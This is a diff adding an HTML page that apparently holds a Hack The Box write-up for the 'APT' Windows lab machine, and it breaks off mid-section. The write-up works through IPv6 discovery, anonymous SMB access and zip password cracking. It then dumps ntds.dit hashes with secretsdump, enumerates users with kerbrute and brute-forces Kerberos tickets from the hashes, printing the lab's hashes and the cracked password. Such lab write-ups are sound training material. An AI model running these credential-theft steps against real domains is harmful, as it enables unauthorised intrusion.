@@ -1,0 +1,1238 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    
+    
+    <meta property="article:tag" content="hackthebox" />
+    
+    <meta property="article:tag" content="htb" />
+    
+    <meta property="article:tag" content="boot2root" />
+    
+    <meta property="article:tag" content="writeup" />
+    
+    <meta property="article:tag" content="windows" />
+    
+    <meta property="article:tag" content="APT" />
+    
+    <meta property="article:tag" content="apt" />
+        
+
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="HTB APT">
+    <meta name="twitter:description" content="10.10.10.213 | 50 pts">
+    <meta name="twitter:site" content="@jebidiah-anthony" />
+    <meta name="twitter:creator" content="@feeeellliix">
+
+    
+    <meta property="og:image" content="https://jebidiah-anthony.github.io/boxes/screenshots/49_unbalanced/unbalanced.png" />
+    
+
+    
+    <meta property="og:title" content="HTB APT" />
+    
+
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>HTB APT | jebidiah-anthony</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="HTB APT" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="10.10.10.213 50 pts" />
+<meta property="og:description" content="10.10.10.213 50 pts" />
+<link rel="canonical" href="https://jebidiah-anthony.github.io/boxes/66_APT.html" />
+<meta property="og:url" content="https://jebidiah-anthony.github.io/boxes/66_APT.html" />
+<meta property="og:site_name" content="jebidiah-anthony" />
+<script type="application/ld+json">
+{"description":"10.10.10.213 50 pts","@type":"WebPage","headline":"HTB APT","url":"https://jebidiah-anthony.github.io/boxes/66_APT.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <style>
+      .user_host { color: green; }
+      .sys_dir { color: #779ECB; }
+      p { color:#aaa; }
+      header { margin-bottom: 0px; }
+      .header .navbtn {
+	position: fixed;
+	width: 0px;
+	visibility: hidden;
+      }
+      .header .title { 
+	padding-left: 69px;
+	vertical-align: middle;
+      }
+      .header .title h2 { margin: 0; } 
+
+      .container {
+	max-width: 1200px;
+      }
+      .sidebar {
+        border-right: 1px dashed #b5e853;
+	bottom: 0;
+        height: 100%;
+	overflow: auto;
+	padding: 10px 10px 10px 10px;
+        position: fixed;
+	top: 0;
+        width: 230px;
+      }
+      .openbtn { 
+	color:#b5e853;
+	font-size:30px;
+	cursor:pointer
+      }
+      .closebtn {
+	color:#b5e853;
+	font-size:69px;
+	cursor:pointer;
+	position:absolute;
+	top:0;
+	right:25px;
+	font-size:36px;
+	margin-left:50px;
+	visibility:hidden;
+      }
+      
+      .ctf_content {
+        margin-left: 250px;
+	padding-bottom: 5px;
+      }
+      .ctf_content h2 {	padding: 20px 0px 0px 10px; }
+      .ctf_content h3 { margin: 20px 0px 0px 10px; }
+      .ctf_content img {
+ 	display: block;
+	margin-left: auto;
+	margin-right: auto;
+	max-width: 100%;
+	padding: 0 10px 0 0;
+      }
+      .ctf_content table { padding: 0 15px; }
+
+      #main_content h1 { padding: 20px 0px 0px 8px; }
+      #main_content h2, p, pre { 
+	padding-right:10px;
+	padding-left:15px; 
+      }
+      #main_content h4 { 
+        margin: 20px 0px 10px 0px; 
+        padding-left: 25px; 
+      }
+      #main_content ol, ul { margin: 0 0 0 10px; }
+
+      .highlighter-rouge { padding: 0 10px 0 10px; }
+
+      .section-divider{
+        border-bottom: 1.5px solid #b5e853;
+        padding-top:28px;
+        width:55%;
+      }
+      
+      @media screen and (min-width: 801px) {
+	.ctf_content {
+          margin-left: 250px;
+	  padding-bottom: 5px;
+        }
+      }
+      @media screen and (max-width: 800px) {
+        header {
+	  background-color: #202020;
+	  height: 80px;
+	  padding: 0px 0 0 0;
+	  position: fixed;
+	  top: 0;
+	}
+        .header .navbtn {
+          height: 80px;
+	  padding: 18px 0 0 20px;
+          visibility: visible;
+	  width: 100px;
+        }
+	.header .title { padding-left: 100px; }
+	.header .title h1 { padding-top: 5px; }
+        .header .title h2 { margin: 0; }
+
+	.container {
+	  width:100%;
+	}
+	.sidebar {
+          width: 0;
+          z-index: 1;
+          overflow-x: hidden;
+	  padding: 0;
+          transition: 0.5s;
+	}
+	.sidebar h2 { 
+	  font-size: 18px; 
+	  padding: 10px 10px 5px 10px;
+	}
+	.sidebar div { 
+	  font-size: 15px; 
+	  padding: 5px 10px 5px 10px;
+	}
+	.closebtn { visibility:visible; }
+
+	.highlighter-rouge { padding: 0 0 0 0; }
+
+	.ctf_content {
+	  margin: 0;
+	}
+	.ctf_content h2 { padding: 15px 0px 0px 5px; }
+        .ctf_content h3 { margin: 15px 10px 0px 15px; }
+        .ctf_content img {
+	  max-width: 100%;
+	  padding: 0 10px 0 0;
+        }
+	.ctf_content table { 
+	  margin: 0 10px 0px -8px;
+	  min-width: 800px;
+	}
+
+        #main_content { margin-top:80px; }
+	#main_content code { font-size: 15px; }
+	#main_content h1 { font-size: 25px; }
+	#main_content h2 { font-size: 22px; }
+	#main_content h3 { font-size: 18px; }
+	#main_content h4 { padding-left: 20px; }
+	#main_content ol, ul {
+	  font-size: 14px;
+	  margin: 0 0 0 12px;
+	  padding: 0 0 0 25px;
+	}
+	#main_content table { font-size: 14px; }
+      }
+
+      @media screen and (max-width: 480px) {
+        header {
+	  background-color: #202020;
+	  height: 70px;
+	  padding: 0px 0 0 0;
+	  position: fixed;
+	  top: 0;
+	}
+        .header .navbtn {
+          height: 70px;
+	  padding: 14px 0 0 18px;
+        }
+	.header .title { padding-left: 100px; }
+	.header .title h1 { font-size:22px; }
+        .header .title h2 { font-size:16px; }
+
+	#main_content code { font-size: 13px; }
+        #main_content ol, ul {
+	  font-size: 13px;
+	  margin: 0 0 0 12px;
+	  padding: 0 0 0 25px;
+	}
+	#main_content table { font-size: 13px; }
+      }
+    </style>
+
+  </head>
+
+  <body>
+    <div class="container">
+       <div id="sidebar" class="sidebar">
+         <span class="closebtn" onclick="closeNav()">&times;</span>      
+	 <div><h2 style="margin-bottom:0; padding-top:20px">[SITE PAGES]</h2>
+
+<div style="padding-top:10px">
+  
+  > <a href="/">whoami</a>
+  
+</div>
+<div style="padding-top:10px">  
+  >  <a href="/htb.html">
+    
+    <strong style="color:orange">htb writeups</strong>
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/ctf.html">
+    
+    ctf writeups
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/projects.html">
+    
+    projects
+    
+  </a>
+</div>
+</div>
+	 <div style="padding-bottom:20px">
+           
+             <h2 style="margin-bottom:0; padding-top: 20px">[HTB BOXES]</h2>
+
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/62_Travel.html">Travel</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/61_Quick.html">Quick</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/49_Unbalanced.html">Unbalanced</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/38_Bitlab.html">Bitlab</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/33_Safe.html">Safe</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/32_Ellingson.html">Ellingson</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/31_WriteUp.html">WriteUp</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/30_swagshop.html">swagshop</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/29_kryptos.html">kryptos</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/28_Luke.html">Luke</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/26_CTF.html">CTF</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/25_Friendzone.html">Friendzone</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/24_Flujab.html">Flujab</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/23_Help.html">Help</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/22_Chaos.html">Chaos</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/21_Lightweight.html">Lightweight</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/20_Irked.html">Irked</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/19_Teacher.html">Teacher</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/15_Mischief.html">Mischief</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/14_Waldo.html">Waldo</a>
+  
+</div>
+
+
+
+	   
+	 </div>
+       </div>
+       <div id="content" class="ctf_content">
+	 <header>
+           <div class="header">
+             <div class="navbtn">
+               <span class="openbtn" onclick="openNav()">&#9776;</span>
+	     </div>
+	     <div class="title">
+               <h1>jebidiah-anthony</h1>
+               <h2 style="padding:0 0 0 0">write-ups and what not</h2>
+	     </div>
+           </div>
+         </header>
+         <section id="main_content"><div class="paragraph">
+<p><h1 style="color:red"> HTB APT (10.10.10.213) </h1></p>
+</div>
+<hr>
+<hr>
+<div class="sect1">
+<h2 id="part-1-initial-recon">PART 1 : INITIAL RECON</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="1-1-nmap-scan">1.1 NMAP scan</h3>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>nmap <span class="nt">--min-rate</span> 3000 <span class="nt">-oN</span> nmap-tcp.initial <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">-v</span> 10.10.10.213
+
+  Host is up.
+  All 65535 scanned ports on 10.10.10.213 are filtered
+
+  Read data files from: /usr/bin/../share/nmap
+  Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>65.54 seconds</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>No open port was found but scanning using IPv6 might yield a different result. But first, the IPv6 of the machine needs to be determined. It could be done using <span style="color:orange"> <a href="https://github.com/mubix/IOXIDResolver">IOXIDResolver</a> </span>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>git clone https://github.com/mubix/IOXIDResolver.git
+
+<span class="nv">$ </span>python3 IOXIDResolver/IOXIDResolver.py <span class="nt">-t</span> 10.10.10.213
+
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Retrieving network interface of 10.10.10.213
+  Address: apt
+  Address: 10.10.10.213
+  Address: dead:beef::b885:d62a:d679:573f
+  Address: dead:beef::cda5:800b:148e:6594</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Adding the recovered IPv6 addresses to the <span style="color:orange"> <code><strong>/etc/hosts</strong></code> </span> file then attempting to scan using the new hostname:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="console"><span class="gp"><mark></span><span class="w"> </span>The following lines are desirable <span class="k">for </span>IPv6 capable hosts
+<span class="go">::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</span><span class="gp"></mark></span><span class="c"><mark>dead:beef::b885:d62a:d679:573f	apt.htb</mark>#</span></code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>nmap <span class="nt">-6</span> <span class="nt">--min-rate</span> 3000 <span class="nt">-oN</span> nmap6-tcp.initial <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">-v</span> apt.htb
+
+  PORT      STATE SERVICE
+  53/tcp    open  domain
+  80/tcp    open  http
+  135/tcp   open  msrpc
+  389/tcp   open  ldap
+  445/tcp   open  microsoft-ds
+  464/tcp   open  kpasswd5
+  593/tcp   open  http-rpc-epmap
+  636/tcp   open  ldapssl
+  5985/tcp  open  wsman
+  9389/tcp  open  adws
+  47001/tcp open  winrm
+
+<span class="nv">$ </span>nmap <span class="nt">-6</span> <span class="nt">-oN</span> nmap6-tcp <span class="nt">-p</span> 53,80,135,389,445,464,593,636,5985,9389,47001 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> apt.htb
+
+  PORT      STATE SERVICE      VERSION
+  53/tcp    open  domain       Simple DNS Plus
+  80/tcp    open  http         Microsoft IIS httpd 10.0
+  | http-methods:
+  |   Supported Methods: OPTIONS TRACE GET HEAD POST
+  |_  Potentially risky methods: TRACE
+  |<em>http-server-header: Microsoft-IIS/10.0
+  |_http-title: Gigantic Hosting | Home
+  135/tcp   open  msrpc        Microsoft Windows RPC
+  389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+  | ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
+  | Subject Alternative Name: DNS:apt.htb.local
+  | Issuer: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
+  | Public Key <span class="nb">type</span>: rsa
+  | Public Key bits: 2048
+  | Signature Algorithm: sha256WithRSAEncryption
+  | Not valid before: 2020-09-24T07:07:18
+  | Not valid after:  2050-09-24T07:17:18
+  | MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
+  |_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
+  |_ssl-date: 2021-04-09T11:25:05+00:00<span class="p">;</span> 0s from scanner time.
+  445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
+  464/tcp   open  kpasswd5?
+  593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+  636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+  | ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
+  | Subject Alternative Name: DNS:apt.htb.local
+  | Issuer: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
+  | Public Key <span class="nb">type</span>: rsa
+  | Public Key bits: 2048
+  | Signature Algorithm: sha256WithRSAEncryption
+  | Not valid before: 2020-09-24T07:07:18
+  | Not valid after:  2050-09-24T07:17:18
+  | MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
+  |_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
+  |_ssl-date: 2021-04-09T11:25:05+00:00<span class="p">;</span> 0s from scanner time.
+  5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+  |_http-server-header: Microsoft-HTTPAPI/2.0
+  |_http-title: Not Found
+  9389/tcp  open  mc-nmf       .NET Message Framing
+  47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+  |_http-server-header: Microsoft-HTTPAPI/2.0
+  |_http-title: Not Found
+  Service Info: Host: APT<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+  Host script results:
+  |_clock-skew: mean: <span class="nt">-11m59s</span>, deviation: 26m49s, median: 0s
+  | smb-os-discovery:
+  |   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
+  |   Computer name: apt
+  |   NetBIOS computer name: APT<span class="se">\x</span>00
+  |   Domain name: htb.local
+  |   Forest name: htb.local
+  |   FQDN: apt.htb.local
+  |</em>  System <span class="nb">time</span>: 2021-04-09T12:24:49+01:00
+  | smb-security-mode:
+  |   account_used: &lt;blank&gt;
+  |   authentication_level: user
+  |   challenge_response: supported
+  |_  message_signing: required
+  | smb2-security-mode:
+  |   2.02:
+  |_    Message signing enabled and required
+  | smb2-time:
+  |   <span class="nb">date</span>: 2021-04-09T11:24:51
+  |_  start_date: 2021-04-09T07:46:49</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Open ports have now been determined and it seems like the machine is part of an Active Directory.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="1-2-updating-etchosts">1.2 Updating /etc/hosts</h3>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="console"><span class="gp"><mark></span><span class="w"> </span>The following lines are desirable <span class="k">for </span>IPv6 capable hosts
+<span class="go">::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</span><span class="gp">dead:beef::b885:d62a:d679:573f	#</span><span class="c">#apt.htb.local HTB.local</mark># apt.htb</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>This might be essential when enumerating/connecting to the machine.</p>
+</div>
+<hr>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-2-port-enumeration">PART 2 : PORT ENUMERATION</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="tcp-port-80-http">TCP PORT 80 : HTTP</h3>
+<div class="imageblock">
+<div class="content">
+<img src="/boxes/screenshots/66_APT/80_landing_page.png" alt="GiganticHosting">
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="tcp-port-445-smb">TCP PORT 445 : SMB</h3>
+<div class="paragraph">
+<p>Enumerating available shares from anonymous login:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>smbclient <span class="nt">-L</span> <span class="se">\\\\</span>apt.htb <span class="nt">-N</span>
+
+  Anonymous login successful
+
+  	  Sharename       Type      Comment
+  	  <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	  <span class="c"><mark>backup          Disk</mark></span>
+	  IPC<span class="nv">$ </span>           IPC       Remote IPC
+	  NETLOGON        Disk      Logon server share
+	  SYSVOL          Disk      Logon server share
+  apt.htb is an IPv6 address <span class="nt">--</span> no workgroup available
+
+<span class="nv">$ </span>smbclient <span class="se">\\\\</span>apt.htb<span class="se">\\</span>backup <span class="nt">-N</span>
+
+  smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+    <span class="nb">.</span>                                   D        0  Thu Sep 24 03:30:52 2020
+    ..                                  D        0  Thu Sep 24 03:30:52 2020
+    <span class="c"><mark>backup.zip</mark>                          A 10650961  Thu Sep 24 03:30:32 2020</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>There is a <span style="color:orange">backup.zip</span> file publicly available in the <span style="color:orange">backup</span> share.</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>smbget <span class="nt">-a</span> <span class="nt">-R</span> smb://apt.htb/backup/backup.zip
+
+  Using workgroup WORKGROUP, guest user
+  smb://apt.htb/backup/backup.zip
+  Downloaded 10.16MB <span class="k">in </span>37 seconds
+
+<span class="nv">$ </span>unzip backup.zip
+
+  Archive:  backup.zip
+     creating: Active Directory/
+  <span class="c"><mark>[backup.zip] Active Directory/ntds.dit password:</mark></span>
+
+<span class="nv">$ </span>fcrackzip <span class="nt">-u</span> <span class="nt">-D</span> <span class="nt">-p</span> /usr/share/wordlists/rockyou.txt backup.zip
+
+  PASSWORD FOUND!!!!: pw <span class="o">==</span> iloveyousomuch</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The <span style="color:orange">backup.zip</span> file was successfully downloaded from the file share but trying to extract the contents requires a password. Luckily, the password was susceptible to a dictionary attack which returned the password as <span style="color:orange">iloveyousomuch</span>. Successfully extracting the contents reveals the following files:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>unzip backup.zip
+
+  Archive:  backup.zip
+  <span class="o">[</span>backup.zip] Active Directory/ntds.dit password: <span class="c"><mark>iloveyousomuch</mark></span>
+    inflating: Active Directory/ntds.dit
+    inflating: Active Directory/ntds.jfm
+     creating: registry/
+    inflating: registry/SECURITY
+    inflating: registry/SYSTEM
+
+<span class="nv">$ </span>find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-exec</span> file <span class="o">{}</span> + 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> backup
+
+  ./Active Directory/ntds.dit: Extensible storage engine DataBase, version 0x620, checksum 0x6f146ad6, page size 8192, Windows version 10.0
+  ./Active Directory/ntds.jfm: data
+  ./registry/SECURITY:         MS Windows registry file, NT/2000 or above
+  ./registry/SYSTEM:           MS Windows registry file, NT/2000 or above</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>There&#8217;s an <span style="color:orange">ntds.dit</span> file which is a database file storing Active Directory data especially user objects and password hashes; however, it&#8217;s encrypted. Along with this are Windows Registry files.</p>
+</div>
+<hr>
+</div>
+<div class="sect2">
+<h3 id="part-3-exploitation">PART 3: EXPLOITATION</h3>
+<div class="sect3">
+<h4 id="3-1-search-for-valid-users">3.1 Search for valid users</h4>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>impacket-secretsdump <span class="nt">-ntds</span> Active<span class="se">\ </span>Directory/ntds.dit <span class="nt">-system</span> registry/SYSTEM <span class="nt">-outputfile</span> user_hashes.txt LOCAL
+
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+
+  <span class="nt">-rwxrwxrwx</span> 1 root root   176132 xxx  x xx:xx  user_hashes.txt.ntds
+  <span class="nt">-rwxrwxrwx</span> 1 root root      136 xxx  x xx:xx  user_hashes.txt.ntds.cleartext
+  <span class="nt">-rwxrwxrwx</span> 1 root root   433995 xxx  x xx:xx  user_hashes.txt.ntds.kerberos</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The extraction is only possible since the password encryption key used for <span style="color:orange">ntds.dit</span> is encrypted using the BOOTKEY which could be found on the SYSTEM registry hive. Otherwise, if the SYSTEM hive is not available, the bootkey could be provided as an argument to <span style="color:orange">secretsdump</span> module of impacket.</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">cat </span>user_hashes.txt.ntds | <span class="nb">head</span> <span class="nt">-n</span> 1
+
+  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+
+<span class="nv">$ </span><span class="nb">cat </span>user_hashes.txt.ntds | <span class="nb">head</span> <span class="nt">-n</span> 1 | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">':'</span> <span class="nt">-f1</span>
+
+  Administrator
+
+<span class="nv">$ </span><span class="nb">cat </span>user_hashes.txt.ntds | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">':'</span> <span class="nt">-f1</span> <span class="o">&gt;</span> ../usernames.txt
+
+<span class="nv">$ </span>./kerbrute_linux_amd64 userenum <span class="nt">-d</span> htb.local <span class="nt">--dc</span> apt.htb.local <span class="nt">-o</span> kerbrute.txt <span class="nt">-v</span> usernames.txt
+      <em>             </em>               <em>
+     / /</em><em>_  </em><em><em>/ /</em>  </em><em><em></em>  <em>/ /</em><em>
+    / //</em>/ _ <span class="se">\/</span> </em><em>/ <em> <span class="se">\/</span> </em></em>/ / / / <em>/ _ <span class="se">\</span>
+   / ,&lt; /  </em>/ /  / /<em>/ / /  / /</em>/ / /<em>/  <em>/
+  /</em>/|<em>|<span class="se">\</em></span></em>/<em>/  /</em>.<em><em>/</em>/   <span class="se">_</span>_,<em>/<span class="se">\</em></span><em>/<span class="se">\</em></span></em>/
+
+  Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - xx/xx/xx - Ronnie Flathers @ropnop
+
+  xxxx/xx/xx xx:xx:xx <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+  xxxx/xx/xx xx:xx:xx <span class="o">&gt;</span>  	apt.htb.local:88
+  <span class="o">[</span>...omitted...]
+
+<span class="nv">$ </span><span class="nb">cat </span>kerbrute.txt | <span class="nb">grep </span>VALID
+
+  xxxx/xx/xx xx:xx:xx <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Administrator@htb.local
+  xxxx/xx/xx xx:xx:xx <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 APT<span class="nv">$@</span>htb.local
+  xxxx/xx/xx xx:xx:xx <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 henry.vinson@htb.local</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The usernames were trimmed from the password hashes recovered in <span style="color:orange">ntds.dit</span> via <code><strong>impacket-secretsdump</strong></code>. The usernames were then passed through <code><strong>kerbrute</strong></code> to check if they were still valid/active users in the domain controller. As for that, three users were found&#8201;&#8212;&#8201;<span style="color:orange">Administrator</span>, <span style="color:orange">APT$</span>, and <span style="color:orange">henry.vinson</span>.</p>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="3-2-generating-a-kerberos-ticket-for-henry-vinson">3.2 Generating a Kerberos Ticket for henry.vinson</h3>
+<div class="paragraph">
+<p>The hashes found for the valid users doesn&#8217;t seem to work when attempting to login via winrm. Since this box seems to be part of an Active Directory, maybe forging a kerberos ticket will work for authenticating into the machine.</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">cat </span>user_hashes.txt.ntds | <span class="nb">grep </span>henry.vinson
+
+  henry.vinson:3647:aad3b435b51404eeaad3b435b51404ee:2de80758521541d19cabba480b260e8f:::
+
+<span class="nv">$ </span><span class="nb">cat </span>user_hashes.txt.ntds | <span class="nb">grep </span>henry.vinson | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">':'</span> <span class="s1">'{printf "%s:%s\n",$3,$4}'</span>
+
+  aad3b435b51404eeaad3b435b51404ee:2de80758521541d19cabba480b260e8f
+
+<span class="nv">$ </span><span class="nb">cat </span>user_hashes.txt.ntds | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">':'</span> <span class="s1">'{printf "%s:%s\n",$3,$4}'</span> | <span class="nb">sort</span> | <span class="nb">uniq</span> <span class="o">&gt;</span> ../hashes.txt
+
+<span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>hashes.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> <span class="nv">attempt</span><span class="o">=</span><span class="si">$(</span>impacket-getTGT HTB.local/henry.vinson@apt.htb <span class="nt">-hashes</span> <span class="nv">$i</span><span class="si">)</span><span class="p">;</span> <span class="k">if</span> <span class="o">!</span> <span class="o">[[</span> <span class="nv">$attempt</span> <span class="o">==</span> <span class="k"><strong></span><span class="s2">"SessionError"</span><span class="k"></strong></span> <span class="o">]]</span><span class="p">;</span> <span class="k">then </span><span class="nb">echo</span> <span class="s2">"HASH FOUND: [</span><span class="nv">$i</span><span class="s2">]"</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$attempt</span><span class="p">;</span> <span class="nb">break</span><span class="p">;</span> <span class="k">fi</span><span class="p">;</span> <span class="k">done</span>
+
+  <span class="o">[</span>...omitted...]
+  HASH FOUND: <span class="o">[</span>aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb]
+  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>henry.vinson@apt.htb.ccache
+
+<span class="nv">$ </span>klist <span class="nt">-c</span> henry.vinson@apt.htb.ccache                                                                         1 ⨯
+
+  Ticket cache: FILE:henry.vinson@apt.htb.ccache
+  Default principal: henry.vinson@HTB.LOCAL
+
+  Valid starting       Expires              Service principal
+  04/09/2021 16:34:58  04/10/2021 02:34:58  krbtgt/HTB.LOCAL@HTB.LOCAL
+  	  renew <span class="k">until </span>04/10/2021 16:34:58</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The shell script below was the one-liner used to brute force the generation of the ticket:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
